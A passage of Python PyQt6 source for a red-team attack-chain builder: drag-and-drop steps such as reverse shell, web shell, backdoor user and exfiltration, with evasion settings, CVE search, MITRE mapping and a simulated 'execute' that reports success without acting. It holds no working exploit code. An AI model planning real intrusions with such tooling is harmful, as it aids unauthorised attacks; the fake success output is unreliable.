        self.prop_name.blockSignals(False)
        self.prop_type.blockSignals(False)
        
        self._current_node = node
        
        # Show/hide payload customization based on node type
        node_type = node.get('type', '')
        if node_type in ('payload', 'exploit', 'exfil'):
            self.payload_group.show()
            self._update_effective_probability()
        else:
            self.payload_group.hide()
        
        # Show branch creation panel
        self.branch_group.show()
        node_id = node.get('id', '')
        if node_id in self.canvas.branches:
            branch = self.canvas.branches[node_id]
            success_target = branch.success_target_id or "None"
            failure_target = branch.failure_target_id or "None"
            self.branch_info.setText(f"‚úÖ Success ‚Üí {success_target}\n‚ùå Failure ‚Üí {failure_target}")
        else:
            self.branch_info.setText("No branches defined\nClick buttons to create")
    
    def _on_node_deleted(self, node_id: str):
        """Handle node deletion"""
        self.output_text.append(f"üóëÔ∏è Deleted node: {node_id}")
        self._on_node_selected({})  # Clear properties
    
    def _on_prop_name_changed(self, text: str):
        """Update node name when property changes"""
        if hasattr(self, '_current_node') and self._current_node:
            node_id = self._current_node.get('id')
            for node in self.canvas.nodes:
                if node['id'] == node_id:
                    node['name'] = text
                    self.canvas.update()
                    break
    
    def _on_prop_type_changed(self, text: str):
        """Update node type when property changes"""
        if hasattr(self, '_current_node') and self._current_node:
            node_id = self._current_node.get('id')
            for node in self.canvas.nodes:
                if node['id'] == node_id:
                    node['type'] = text
                    self.canvas.update()
                    break
    
    def _delete_selected_node(self):
        """Delete the currently selected node"""
        if self.canvas.selected_node_id:
            self._save_undo_state()
            self.canvas.delete_node(self.canvas.selected_node_id)
    
    def load_exploit_library(self):
        """Load exploit library into tree"""
        self._init_connections()  # Initialize after canvas is created
        categories = {
            "üîç Reconnaissance": [
                ("Port Scanner", "recon"),
                ("Service Enum", "recon"),
                ("DNS Recon", "recon"),
                ("Web Fingerprint", "recon")
            ],
            "üí• Exploitation": [
                ("SQL Injection", "exploit"),
                ("Buffer Overflow", "exploit"),
                ("RCE Exploit", "exploit"),
                ("Auth Bypass", "exploit")
            ],
            "üéØ Payloads": [
                ("Reverse Shell", "payload"),
                ("Meterpreter", "payload"),
                ("Web Shell", "payload"),
                ("Beacon", "payload")
            ],
            "üîí Persistence": [
                ("Registry Key", "persistence"),
                ("Cron Job", "persistence"),
                ("Service Install", "persistence"),
                ("Backdoor User", "persistence")
            ],
            "üì§ Exfiltration": [
                ("DNS Exfil", "exfil"),
                ("HTTP Exfil", "exfil"),
                ("Stego Exfil", "exfil"),
                ("Cloud Exfil", "exfil")
            ]
        }
        
        for category, exploits in categories.items():
            cat_item = QTreeWidgetItem([category])
            cat_item.setExpanded(True)
            
            for name, exp_type in exploits:
                exp_item = QTreeWidgetItem([name])
                exp_item.setData(0, Qt.ItemDataRole.UserRole, exp_type)
                cat_item.addChild(exp_item)
            
            self.exploit_tree.addTopLevelItem(cat_item)
    
    def _start_tree_drag(self):
        """Custom drag handler for exploit tree items"""
        item = self.exploit_tree.currentItem()
        if not item or not item.parent():  # Only drag leaf items
            return
        
        name = item.text(0)
        exp_type = item.data(0, Qt.ItemDataRole.UserRole) or 'exploit'
        
        # Create drag with exploit data
        drag = QDrag(self.exploit_tree)
        mime_data = QMimeData()
        
        data = {'name': name, 'type': exp_type}
        mime_data.setData('application/x-exploit', json.dumps(data).encode())
        mime_data.setText(name)
        
        drag.setMimeData(mime_data)
        
        # Create drag pixmap
        pixmap = QPixmap(150, 50)
        pixmap.fill(QColor(0, 0, 0, 0))
        painter = QPainter(pixmap)
        painter.setRenderHint(QPainter.RenderHint.Antialiasing)
        
        type_colors = {
            'recon': QColor(0, 136, 255),
            'exploit': QColor(255, 136, 0),
            'payload': QColor(255, 0, 0),
            'persistence': QColor(255, 0, 255),
            'exfil': QColor(0, 255, 0)
        }
        color = type_colors.get(exp_type, QColor(0, 255, 0))
        
        painter.setPen(QPen(color, 2))
        painter.setBrush(QBrush(QColor(color.red(), color.green(), color.blue(), 80)))
        painter.drawRoundedRect(2, 2, 146, 46, 6, 6)
        
        painter.setPen(color)
        painter.setFont(QFont('Consolas', 10, QFont.Weight.Bold))
        painter.drawText(10, 30, name[:18])
        painter.end()
        
        drag.setPixmap(pixmap)
        drag.setHotSpot(QPoint(75, 25))
        
        drag.exec(Qt.DropAction.CopyAction)
    
    def add_to_chain(self, item: QTreeWidgetItem, column: int):
        """Add exploit to chain canvas"""
        if item.parent():  # Only leaf items
            name = item.text(0)
            exp_type = item.data(0, Qt.ItemDataRole.UserRole)
            
            self.chain_counter += 1
            node_id = f"node_{self.chain_counter}"
            
            # Position based on type
            x_positions = {'recon': 50, 'exploit': 200, 'payload': 350, 
                          'persistence': 500, 'exfil': 650}
            x = x_positions.get(exp_type, 50)
            y = 50 + (len([n for n in self.canvas.nodes if n['type'] == exp_type]) * 80)
            
            self.canvas.add_node(node_id, name, exp_type, x, y)
            
            # Auto-connect to previous node of compatible type
            if len(self.canvas.nodes) > 1:
                prev_node = self.canvas.nodes[-2]
                self.canvas.connect_nodes(prev_node['id'], node_id)
            
            self.update_stats()
    
    def clear_chain(self):
        self.canvas.nodes.clear()
        self.canvas.connections.clear()
        self.canvas.update()
        self.chain_counter = 0
        self.update_stats()
    
    def update_stats(self):
        self.node_count.setText(f"Nodes: {len(self.canvas.nodes)}")
        self.conn_count.setText(f"Connections: {len(self.canvas.connections)}")
        
        # Calculate risk
        node_count = len(self.canvas.nodes)
        if node_count >= 5:
            self.risk_label.setText("Risk: Critical")
            self.risk_label.setStyleSheet("color: #ff0000;")
        elif node_count >= 3:
            self.risk_label.setText("Risk: High")
            self.risk_label.setStyleSheet("color: #ff8800;")
        elif node_count >= 1:
            self.risk_label.setText("Risk: Medium")
            self.risk_label.setStyleSheet("color: #ffff00;")
        else:
            self.risk_label.setText("Risk: Low")
            self.risk_label.setStyleSheet("color: #00ff00;")
        
        # Update chain complexity scoring
        self._update_complexity_score()
        self._update_mitre_mapping()
        
        # Update resource estimation and prerequisites (Ultimate Edition)
        self._update_resource_estimation()
        self._update_prerequisites_list()
        
        # Update kill chain, threat intel, and what-if (Ultimate Edition)
        self._update_killchain_mapping()
        self._update_threat_intel()
        self._run_whatif_analysis()
    
    def _update_complexity_score(self):
        """Update the chain complexity score panel"""
        score = ChainComplexityScore().calculate(self.canvas.nodes, self.canvas.connections)
        
        # Complexity label
        complexity_colors = {'Low': '#00ff00', 'Medium': '#ffff00', 'High': '#ff8800', 'Critical': '#ff0000'}
        self.complexity_label.setText(f"Complexity: {score.complexity_rating}")
        self.complexity_label.setStyleSheet(f"color: {complexity_colors.get(score.complexity_rating, '#00ff00')}; font-weight: bold; font-size: 12px;")
        
        # Attack surface (normalize to 0-100)
        surface_pct = min(100, int(score.attack_surface_score * 10))
        self.attack_surface_bar.setValue(surface_pct)
        
        # Detection risk
        detection_pct = int(score.detection_risk * 100)
        self.detection_risk_bar.setValue(detection_pct)
        
        # Estimated time
        self.est_time_label.setText(f"‚è±Ô∏è Est. Time: {score.estimated_time_minutes} min")
    
    def _update_mitre_mapping(self):
        """Update the MITRE ATT&CK mapping panel"""
        self.mitre_list.clear()
        
        techniques_found = set()
        for node in self.canvas.nodes:
            node_type = node.get('type', 'exploit')
            if node_type in MITRE_ATTACK_MAPPING:
                mapping = MITRE_ATTACK_MAPPING[node_type]
                for tech_id, tech_name in mapping['techniques'][:2]:  # Top 2 techniques per type
                    if tech_id not in techniques_found:
                        techniques_found.add(tech_id)
                        item = QListWidgetItem(f"{tech_id}: {tech_name}")
                        item.setForeground(QColor(mapping['color']))
                        self.mitre_list.addItem(item)
        
        self.mitre_coverage.setText(f"Coverage: {len(techniques_found)} techniques")
    
    def _search_cves(self):
        """Search CVEs from NVD API"""
        keyword = self.cve_search.text().strip()
        if not keyword:
            self.search_status.setText("‚ö†Ô∏è Enter a search term")
            return
        
        self.search_status.setText("üîÑ Searching NVD...")
        self.cve_results.clear()
        
        self.search_worker = ExploitSearchWorker(keyword, 'cve')
        self.search_worker.results_ready.connect(self._on_search_results)
        self.search_worker.error.connect(self._on_search_error)
        self.search_worker.start()
    
    def _search_exploitdb(self):
        """Search ExploitDB"""
        keyword = self.cve_search.text().strip()
        if not keyword:
            self.search_status.setText("‚ö†Ô∏è Enter a search term")
            return
        
        self.search_status.setText("üîÑ Searching ExploitDB...")
        self.cve_results.clear()
        
        self.search_worker = ExploitSearchWorker(keyword, 'exploitdb')
        self.search_worker.results_ready.connect(self._on_search_results)
        self.search_worker.error.connect(self._on_search_error)
        self.search_worker.start()
    
    def _on_search_results(self, results: List[Dict]):
        """Handle search results"""
        self.cve_results.clear()
        
        if not results:
            self.search_status.setText("‚ùå No results found")
            return
        
        for result in results[:10]:
            if 'id' in result:
                cve_id = result.get('id', '')
                severity = result.get('severity', 'UNKNOWN')
                source = result.get('source', '')
                name = result.get('name', result.get('description', '')[:50])
                
                severity_icons = {'CRITICAL': 'üî¥', 'HIGH': 'üü†', 'MEDIUM': 'üü°', 'LOW': 'üü¢', 'UNKNOWN': '‚ö™'}
                icon = severity_icons.get(severity, '‚ö™')
                
                item = QListWidgetItem(f"{icon} {cve_id} - {name[:40]}")
                item.setData(Qt.ItemDataRole.UserRole, result)
                
                severity_colors = {'CRITICAL': '#ff0000', 'HIGH': '#ff8800', 'MEDIUM': '#ffff00', 'LOW': '#00ff00'}
                item.setForeground(QColor(severity_colors.get(severity, '#888')))
                
                self.cve_results.addItem(item)
        
        self.search_status.setText(f"‚úÖ Found {len(results)} results - double-click to add")
    
    def _on_search_error(self, error: str):
        """Handle search error"""
        self.search_status.setText(f"‚ùå Error: {error[:30]}")
    
    def _add_cve_to_chain(self, item: QListWidgetItem):
        """Add CVE/exploit from search results to chain"""
        data = item.data(Qt.ItemDataRole.UserRole)
        if not data:
            return
        
        cve_id = data.get('id', data.get('cve', ''))
        name = data.get('name', cve_id)
        
        self.chain_counter += 1
        node_id = f"node_{self.chain_counter}"
        
        # Position based on existing nodes
        x = 200 + (len([n for n in self.canvas.nodes if n['type'] == 'exploit']) * 80)
        y = 150
        
        # Add node with CVE info and MITRE mapping
        self.canvas.add_node(node_id, name[:20], 'exploit', x, y, cve=cve_id, mitre_id='T1190')
        
        # Auto-connect
        if len(self.canvas.nodes) > 1:
            prev_node = self.canvas.nodes[-2]
            self.canvas.connect_nodes(prev_node['id'], node_id)
        
        self.update_stats()
        self.output_text.append(f"‚ûï Added {cve_id}: {name[:30]}")
    
    def _filter_library(self, text: str):
        """Filter the exploit library tree"""
        text_lower = text.lower()
        for i in range(self.exploit_tree.topLevelItemCount()):
            category = self.exploit_tree.topLevelItem(i)
            category_visible = False
            
            for j in range(category.childCount()):
                child = category.child(j)
                matches = text_lower in child.text(0).lower()
                child.setHidden(not matches and text_lower != '')
                if matches or text_lower == '':
                    category_visible = True
            
            category.setHidden(not category_visible)
    
    def _run_simulation(self):
        """Run Monte Carlo simulation on the chain"""
        if not self.canvas.nodes:
            self.output_text.append("‚ö†Ô∏è No nodes to simulate")
            return
        
        runs = self.sim_runs_spin.value()
        result = ChainSimulationResult().calculate(
            self.canvas.nodes, 
            self.canvas.connections,
            self.canvas.branches,
            runs
        )
        
        # Update UI
        self.sim_success_bar.setValue(int(result.overall_success_rate * 100))
        self.sim_avg_steps.setText(f"üìä Avg Steps: {result.avg_steps_completed:.1f}/{len(self.canvas.nodes)}")
        
        if result.bottleneck_node:
            bottleneck = next((n for n in self.canvas.nodes if n['id'] == result.bottleneck_node), None)
            if bottleneck:
                fail_count = result.failure_points.get(result.bottleneck_node, 0)
                self.sim_bottleneck.setText(f"‚ö†Ô∏è Bottleneck: {bottleneck['name']} ({fail_count} failures)")
        else:
            self.sim_bottleneck.setText("‚ö†Ô∏è Bottleneck: None")
        
        # Output details
        self.output_text.append(f"\nüé≤ Simulation Results ({runs} runs):")
        self.output_text.append(f"   ‚úÖ Success Rate: {result.overall_success_rate*100:.1f}%")
        self.output_text.append(f"   üìä Avg Steps: {result.avg_steps_completed:.1f}")
        self.output_text.append(f"   ‚úîÔ∏è Successful: {result.successful_runs}")
        self.output_text.append(f"   ‚ùå Failed: {result.failed_runs}")
        
        if result.failure_points:
            self.output_text.append("   üî¥ Failure Points:")
            for node_id, count in sorted(result.failure_points.items(), key=lambda x: -x[1])[:3]:
                node = next((n for n in self.canvas.nodes if n['id'] == node_id), None)
                if node:
                    self.output_text.append(f"      - {node['name']}: {count} failures ({count/runs*100:.0f}%)")
    
    def _start_branch_creation(self, branch_type: str):
        """Start creating a conditional branch"""
        if not self.canvas.selected_node_id:
            self.output_text.append("‚ö†Ô∏è Select a node first")
            return
        
        self.canvas.start_branch_creation(self.canvas.selected_node_id, branch_type)
        icon = "‚úÖ" if branch_type == 'success' else "‚ùå"
        self.branch_info.setText(f"{icon} Click target node for {branch_type} path...")
        self.output_text.append(f"üîÄ Creating {branch_type} branch - click target node")
    
    def _on_payload_type_changed(self, index: int):
        """Handle payload type change"""
        if not hasattr(self, '_current_node') or not self._current_node:
            return
        
        payload_types = list(PayloadCustomizer.PAYLOAD_TYPES.keys())
        if 0 <= index < len(payload_types):
            payload_type = payload_types[index]
            node_id = self._current_node.get('id')
            for node in self.canvas.nodes:
                if node['id'] == node_id:
                    node['payload_type'] = payload_type
                    break
            self._update_effective_probability()
            self.canvas.update()
    
    def _on_obfuscation_changed(self, index: int):
        """Handle obfuscation change"""
        if not hasattr(self, '_current_node') or not self._current_node:
            return
        
        if 0 <= index < len(PayloadCustomizer.OBFUSCATION_TECHNIQUES):
            tech_id, _, _ = PayloadCustomizer.OBFUSCATION_TECHNIQUES[index]
            node_id = self._current_node.get('id')
            for node in self.canvas.nodes:
                if node['id'] == node_id:
                    node['obfuscation'] = tech_id
                    break
            self._update_effective_probability()
            self.canvas.update()
    
    def _on_evasion_changed(self, index: int):
        """Handle evasion technique change"""
        if not hasattr(self, '_current_node') or not self._current_node:
            return
        
        if 0 <= index < len(PayloadCustomizer.EVASION_TECHNIQUES):
            tech_id, _, _ = PayloadCustomizer.EVASION_TECHNIQUES[index]
            node_id = self._current_node.get('id')
            for node in self.canvas.nodes:
                if node['id'] == node_id:
                    node['evasion'] = tech_id
                    break
            self._update_effective_probability()
            self.canvas.update()
    
    def _update_effective_probability(self):
        """Update the effective probability display"""
        if hasattr(self, '_current_node') and self._current_node:
            prob = self.canvas.get_node_success_probability(self._current_node['id'])
            color = '#00ff00' if prob >= 0.7 else '#ffff00' if prob >= 0.4 else '#ff4444'
            self.effective_prob_label.setText(f"Effective Success: {int(prob * 100)}%")
            self.effective_prob_label.setStyleSheet(f"color: {color}; font-weight: bold;")
    
    def validate_chain(self):
        self.validation_list.clear()
        
        if not self.canvas.nodes:
            item = QListWidgetItem("‚ö†Ô∏è No nodes in chain")
            item.setForeground(QColor('#ffff00'))
            self.validation_list.addItem(item)
            return
        
        # Check for recon at start
        if self.canvas.nodes[0]['type'] != 'recon':
            item = QListWidgetItem("‚ö†Ô∏è Chain should start with recon")
            item.setForeground(QColor('#ffff00'))
            self.validation_list.addItem(item)
        else:
            item = QListWidgetItem("‚úÖ Starts with reconnaissance")
            item.setForeground(QColor('#00ff00'))
            self.validation_list.addItem(item)
        
        # Check connectivity
        if len(self.canvas.connections) >= len(self.canvas.nodes) - 1:
            item = QListWidgetItem("‚úÖ All nodes connected")
            item.setForeground(QColor('#00ff00'))
            self.validation_list.addItem(item)
        else:
            item = QListWidgetItem("‚ùå Disconnected nodes")
            item.setForeground(QColor('#ff0000'))
            self.validation_list.addItem(item)
        
        item = QListWidgetItem("‚úÖ Chain validation complete")
        item.setForeground(QColor('#00ff00'))
        self.validation_list.addItem(item)
    
    def load_template(self, template_id: str):
        """Load a pre-built attack chain template"""
        if template_id not in self.TEMPLATES:
            return
        
        # Save current state for undo
        self._save_undo_state()
        
        # Clear current chain
        self.canvas.nodes.clear()
        self.canvas.connections.clear()
        self.chain_counter = 0
        
        template = self.TEMPLATES[template_id]
        
        # Add nodes from template
        for name, node_type, x, y in template["nodes"]:
            self.chain_counter += 1
            node_id = f"node_{self.chain_counter}"
            self.canvas.add_node(node_id, name, node_type, x, y)
            
            # Connect to previous node
            if len(self.canvas.nodes) > 1:
                prev_node = self.canvas.nodes[-2]
                self.canvas.connect_nodes(prev_node['id'], node_id)
        
        self.update_stats()
        self.output_text.append(f"‚úÖ Loaded template: {template['name']}")
    
    def _save_undo_state(self):
        """Save current state for undo"""
        state = {
            'nodes': [n.copy() for n in self.canvas.nodes],
            'connections': list(self.canvas.connections),
            'counter': self.chain_counter
        }
        self.undo_stack.append(state)
        # Keep only last 20 states
        if len(self.undo_stack) > 20:
            self.undo_stack.pop(0)
    
    def undo_action(self):
        """Undo the last action"""
        if not self.undo_stack:
            self.output_text.append("‚ö†Ô∏è Nothing to undo")
            return
        
        state = self.undo_stack.pop()
        self.canvas.nodes = state['nodes']
        self.canvas.connections = state['connections']
        self.chain_counter = state['counter']
        self.canvas.update()
        self.update_stats()
        self.output_text.append("‚Ü© Undo successful")
    
    def _auto_arrange(self):
        """Auto-arrange nodes by type"""
        if not self.canvas.nodes:
            self.output_text.append("‚ö†Ô∏è No nodes to arrange")
            return
        
        self._save_undo_state()
        self.canvas.auto_arrange()
        self.output_text.append("üìê Nodes auto-arranged by type")
    
    def _duplicate_node(self):
        """Duplicate the selected node"""
        if not self.canvas.selected_node_id:
            self.output_text.append("‚ö†Ô∏è No node selected to duplicate")
            return
        
        self._save_undo_state()
        new_node = self.canvas.duplicate_selected()
        if new_node:
            self.chain_counter += 1
            self.update_stats()
            self.output_text.append(f"üìã Duplicated: {new_node['name']}")
    
    def _validate_target(self, text: str):
        """Validate target input and update status indicator"""
        import re
        text = text.strip()
        
        if not text:
            self.target_status.setText("‚ö™")
            self.target_status.setToolTip("Target not set")
            return
        
        # Check for valid URL
        url_pattern = r'^https?://[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9](:[0-9]+)?(/.*)?$'
        # Check for valid IP (v4)
        ip_pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(:[0-9]+)?$'
        # Check for hostname
        hostname_pattern = r'^[a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9](:[0-9]+)?$'
        
        if re.match(url_pattern, text):
            self.target_status.setText("üü¢")
            self.target_status.setToolTip(f"Valid URL: {text}")
        elif re.match(ip_pattern, text):
            self.target_status.setText("üü¢")
            self.target_status.setToolTip(f"Valid IP: {text}")
        elif re.match(hostname_pattern, text):
            self.target_status.setText("üü°")
            self.target_status.setToolTip(f"Hostname (no protocol): {text}")
        else:
            self.target_status.setText("üî¥")
            self.target_status.setToolTip("Invalid target format")
    
    def _get_target_info(self) -> dict:
        """Parse and return target information"""
        import re
        from urllib.parse import urlparse
        
        text = self.target_input.text().strip()
        info = {
            'raw': text,
            'host': '',
            'port': None,
            'protocol': 'https',
            'is_ip': False,
            'is_valid': False
        }
        
        if not text:
            return info
        
        # Check if it's a URL
        if text.startswith('http://') or text.startswith('https://'):
            parsed = urlparse(text)
            info['protocol'] = parsed.scheme
            info['host'] = parsed.hostname or ''
            info['port'] = parsed.port
            info['is_valid'] = bool(info['host'])
        else:
            # Check for IP or hostname with optional port
            if ':' in text:
                host, port = text.rsplit(':', 1)
                try:
                    info['port'] = int(port)
                    info['host'] = host
                except ValueError:
                    info['host'] = text
            else:
                info['host'] = text
            
            # Check if it's an IP
            ip_pattern = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
            info['is_ip'] = bool(re.match(ip_pattern, info['host']))
            info['is_valid'] = len(info['host']) > 0
        
        return info
    
    def execute_chain(self):
        """Execute the attack chain with animated visualization"""
        if not self.canvas.nodes:
            self.output_text.append("‚ö†Ô∏è No nodes in chain to execute")
            return
        
        # Check for target
        target_info = self._get_target_info()
        if not target_info['is_valid']:
            self.output_text.append("‚ö†Ô∏è Please enter a valid target URL or IP address")
            self.output_text.append("   Examples: https://target.com, 192.168.1.1, target.local:8080")
            self.target_input.setFocus()
            return
        
        if self.canvas.is_executing:
            # Stop execution
            self.canvas.stop_execution()
            self.output_text.append("üõë Execution stopped")
            return
        
        self.output_text.clear()
        self.output_text.append(f"üöÄ Executing chain: {self.chain_name.text()}")
        self.output_text.append(f"üéØ Target: {target_info['raw']}")
        self.output_text.append(f"   Host: {target_info['host']} | Protocol: {target_info['protocol'].upper()}" + 
                                (f" | Port: {target_info['port']}" if target_info['port'] else ""))
        self.output_text.append(f"üìä {len(self.canvas.nodes)} nodes, {len(self.canvas.connections)} connections")
        self.output_text.append("")
        
        # Calculate complexity score for output
        score = ChainComplexityScore().calculate(self.canvas.nodes, self.canvas.connections)
        self.output_text.append(f"üìà Complexity: {score.complexity_rating}")
        self.output_text.append(f"üéØ Detection Risk: {int(score.detection_risk * 100)}%")
        self.output_text.append(f"‚è±Ô∏è Estimated Time: {score.estimated_time_minutes} min")
        self.output_text.append("")
        
        # Start animated execution
        self.canvas.start_execution(0)
        self._execution_step = 0
        
        # Create execution timer
        self.execution_timer = QTimer()
        self.execution_timer.timeout.connect(self._advance_execution_step)
        self.execution_timer.start(1500)  # 1.5 seconds per step
        
        # Update output for first step
        self._update_execution_output()
    
    def _advance_execution_step(self):
        """Advance to next execution step"""
        self._execution_step += 1
        
        if self._execution_step < len(self.canvas.nodes):
            self.canvas.advance_execution()
            self._update_execution_output()
        else:
            # Execution complete
            self.execution_timer.stop()
            self.canvas.stop_execution()
            self.output_text.append("")
            self.output_text.append("‚úÖ Chain execution complete!")
            self.output_text.append(f"üéâ All {len(self.canvas.nodes)} steps executed successfully")
    
    def _update_execution_output(self):
        """Update execution output for current step"""
        node = self.canvas.nodes[self._execution_step]
        target_info = self._get_target_info()
        
        # Get MITRE technique for this node type
        mitre_info = ""
        if node['type'] in MITRE_ATTACK_MAPPING:
            techniques = MITRE_ATTACK_MAPPING[node['type']]['techniques']
            if techniques:
                mitre_info = f" [{techniques[0][0]}]"
        
        cve_info = f" ({node.get('cve', '')})" if node.get('cve') else ""
        
        self.output_text.append(f"‚ö° Step {self._execution_step + 1}: {node['name']}{cve_info}{mitre_info}")
        self.output_text.append(f"   Target: {target_info['host']} | Type: {node['type'].upper()} | Status: RUNNING...")
    
    def _setup_shortcuts(self):
        """Setup keyboard shortcuts"""
        # Undo shortcut
        undo_shortcut = QShortcut(QKeySequence('Ctrl+Z'), self)
        undo_shortcut.activated.connect(self.undo_action)
        
        # Save shortcut
        save_shortcut = QShortcut(QKeySequence('Ctrl+S'), self)
        save_shortcut.activated.connect(self.save_chain)
        
        # Export shortcut
        export_shortcut = QShortcut(QKeySequence('Ctrl+Shift+E'), self)
        export_shortcut.activated.connect(self.export_chain)
        
        # Import shortcut
        import_shortcut = QShortcut(QKeySequence('Ctrl+Shift+I'), self)
        import_shortcut.activated.connect(self.import_chain)
        
        # Duplicate shortcut
        dup_shortcut = QShortcut(QKeySequence('Ctrl+D'), self)
        dup_shortcut.activated.connect(self._duplicate_node)
        
        # Arrange shortcut
        arrange_shortcut = QShortcut(QKeySequence('Ctrl+L'), self)
        arrange_shortcut.activated.connect(self._auto_arrange)
        
        # Clear shortcut
        clear_shortcut = QShortcut(QKeySequence('Ctrl+Shift+X'), self)
        clear_shortcut.activated.connect(self.clear_chain)
        
        # Select all shortcut
        select_all_shortcut = QShortcut(QKeySequence('Ctrl+A'), self)
        select_all_shortcut.activated.connect(self._select_all_nodes)
    
    def _select_all_nodes(self):
        """Select all nodes (visual feedback only)"""
        if self.canvas.nodes:
            self.output_text.append(f"üìã {len(self.canvas.nodes)} nodes in chain")
    
    def save_chain(self):
        """Save chain to internal library"""
        if not self.canvas.nodes:
            self.output_text.append("‚ö†Ô∏è No nodes to save")
            return
        
        chain_data = self._get_chain_data()
        
        # Save to chains directory
        chains_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'chains')
        os.makedirs(chains_dir, exist_ok=True)
        
        filename = f"{self.chain_name.text()}.json"
        filepath = os.path.join(chains_dir, filename)
        
        try:
            with open(filepath, 'w') as f:
                json.dump(chain_data, f, indent=2)
            self.output_text.append(f"üíæ Saved: {filename}")
        except Exception as e:
            self.output_text.append(f"‚ùå Save error: {str(e)}")
    
    def export_chain(self):
        """Export chain to multiple formats with advanced options"""
        if not self.canvas.nodes:
            QMessageBox.warning(self, "Export", "No chain to export")
            return
        
        # Create export dialog with format options
        dialog = QDialog(self)
        dialog.setWindowTitle("üì§ Export Attack Chain")
        dialog.setStyleSheet("""
            QDialog {
                background: #0d1117;
                color: #e6edf3;
            }
            QLabel { color: #e6edf3; }
            QGroupBox {
                color: #00ff00;
                border: 1px solid #333;
                margin-top: 10px;
                padding-top: 15px;
                border-radius: 5px;
            }
        """)
        dialog.setMinimumWidth(400)
        
        layout = QVBoxLayout(dialog)
        
        # Format selection
        format_group = QGroupBox("üìÅ Export Format")
        format_layout = QVBoxLayout(format_group)
        
        self.export_format = QComboBox()
        self.export_format.addItems([
            "üìÑ JSON - Machine Readable",
            "üåê HTML - Interactive Report",
            "üìù Markdown - Documentation",
            "‚öôÔ∏è YAML - Automation Config",
            "üìä All Formats - Complete Export"
        ])
        self.export_format.setStyleSheet("""
            QComboBox {
                background: #1a1a1a; color: #00ff00;
                border: 1px solid #333; padding: 8px;
                border-radius: 4px;
            }
        """)
        format_layout.addWidget(self.export_format)
        layout.addWidget(format_group)
        
        # Options
        options_group = QGroupBox("‚öôÔ∏è Export Options")
        options_layout = QVBoxLayout(options_group)
        
        self.include_complexity = QCheckBox("Include complexity analysis")
        self.include_complexity.setChecked(True)
        self.include_complexity.setStyleSheet("color: #e6edf3;")
        options_layout.addWidget(self.include_complexity)
        
        self.include_mitre = QCheckBox("Include MITRE ATT&CK mapping")
        self.include_mitre.setChecked(True)
        self.include_mitre.setStyleSheet("color: #e6edf3;")
        options_layout.addWidget(self.include_mitre)
        
        self.include_simulation = QCheckBox("Include simulation results")
        self.include_simulation.setChecked(True)
        self.include_simulation.setStyleSheet("color: #e6edf3;")
        options_layout.addWidget(self.include_simulation)
        
        self.include_resources = QCheckBox("Include resource estimation")
        self.include_resources.setChecked(True)
        self.include_resources.setStyleSheet("color: #e6edf3;")
        options_layout.addWidget(self.include_resources)
        
        layout.addWidget(options_group)
        
        # Buttons
        btn_layout = QHBoxLayout()
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet("""
            QPushButton {
                background: #1a1a1a; color: #888;
                border: 1px solid #333; padding: 10px 20px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #252525; }
        """)
        cancel_btn.clicked.connect(dialog.reject)
        btn_layout.addWidget(cancel_btn)
        
        export_btn = QPushButton("üì§ Export")
        export_btn.setStyleSheet("""
            QPushButton {
                background: #003300; color: #00ff00;
                border: 1px solid #00ff00; padding: 10px 20px;
                border-radius: 4px;
            }
            QPushButton:hover { background: #004400; }
        """)
        export_btn.clicked.connect(dialog.accept)
        btn_layout.addWidget(export_btn)
        layout.addLayout(btn_layout)
        
        if dialog.exec() != QDialog.DialogCode.Accepted:
            return
        
        # Get chain data with all metadata
        chain_data = self._get_enhanced_chain_data()
        
        format_idx = self.export_format.currentIndex()
        
        # Determine export format and file extension
        if format_idx == 0:  # JSON
            default_ext = ".json"
            filter_str = "JSON Files (*.json)"
        elif format_idx == 1:  # HTML
            default_ext = ".html"
            filter_str = "HTML Files (*.html)"
        elif format_idx == 2:  # Markdown
            default_ext = ".md"
            filter_str = "Markdown Files (*.md)"
        elif format_idx == 3:  # YAML
            default_ext = ".yaml"
            filter_str = "YAML Files (*.yaml)"
        else:  # All formats
            default_ext = ""
            filter_str = "All Files (*)"
        
        default_name = f"{self.chain_name.text()}{default_ext}"
        
        if format_idx == 4:  # All formats - get directory
            from PyQt6.QtWidgets import QFileDialog
            directory = QFileDialog.getExistingDirectory(self, "Select Export Directory")
            if not directory:
                return
            
            base_name = self.chain_name.text()
            success_count = 0
            
            # Export all formats
            if ChainExportEngine.export_to_json(chain_data, f"{directory}/{base_name}.json"):
                success_count += 1
            if ChainExportEngine.export_to_html(chain_data, f"{directory}/{base_name}.html"):
                success_count += 1
            if ChainExportEngine.export_to_markdown(chain_data, f"{directory}/{base_name}.md"):
                success_count += 1
            if ChainExportEngine.export_to_yaml(chain_data, f"{directory}/{base_name}.yaml"):
                success_count += 1
            
            self.output_text.append(f"üì§ Exported {success_count}/4 formats to: {directory}")
            QMessageBox.information(self, "Export Complete", 
                f"Successfully exported {success_count}/4 formats!\n\nLocation: {directory}")
            return
        
        # Single format export
        filepath, _ = QFileDialog.getSaveFileName(
            self, "Export Attack Chain", default_name, filter_str
        )
        
        if not filepath:
            return
        
        success = False
        try:
            if format_idx == 0:
                success = ChainExportEngine.export_to_json(chain_data, filepath)
            elif format_idx == 1:
                success = ChainExportEngine.export_to_html(chain_data, filepath)
            elif format_idx == 2:
                success = ChainExportEngine.export_to_markdown(chain_data, filepath)
            elif format_idx == 3:
                success = ChainExportEngine.export_to_yaml(chain_data, filepath)
            
            if success:
                self.output_text.append(f"üì§ Exported: {os.path.basename(filepath)}")
                QMessageBox.information(self, "Export", f"Chain exported successfully!\n\n{filepath}")
            else:
                raise Exception("Export function returned False")
                
        except Exception as e:
            self.output_text.append(f"‚ùå Export error: {str(e)}")
            QMessageBox.critical(self, "Export Error", f"Failed to export: {str(e)}")
    
    def _get_enhanced_chain_data(self) -> dict:
        """Get chain data with all enhanced metadata for export"""
        # Get basic chain data
        basic_data = self._get_chain_data()
        
        # Add complexity analysis
        complexity = self._calculate_complexity()
        basic_data['complexity'] = {
            'total_score': complexity.total_score,
            'attack_surface': complexity.attack_surface,
            'detection_risk': complexity.detection_risk,
